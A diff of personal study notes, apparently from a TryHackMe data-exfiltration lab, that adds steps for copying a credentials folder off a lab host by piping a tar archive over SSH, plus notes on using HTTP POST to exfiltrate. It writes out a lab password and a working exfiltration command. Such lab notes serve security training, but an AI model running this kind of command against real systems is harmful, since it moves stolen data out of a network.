@@ -42,3 +42,19 @@ thm@jump-box cat task4/creds.txt
 
 Exfiltration using SSH
 -establishes a secure channel to interact and move data between client and server
+ssh thm@victim1.thm.com
+-pass: tryhackme
+cat task5/Creds.txt
+tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
+thm@jump-box$ cd /tmp/task5/
+thm@jump-box$ cat creds.txt
+
+---------------------------------------------------------------------------------------------
+
+Exfiltrate using HTTPS
+-need control of a webserver with server-side programming language
+-HTTP POST requests
+1. requests aren't cached
+2. don't remain in browser history
+3. can't be bookmarked
+4. no restriction on data length
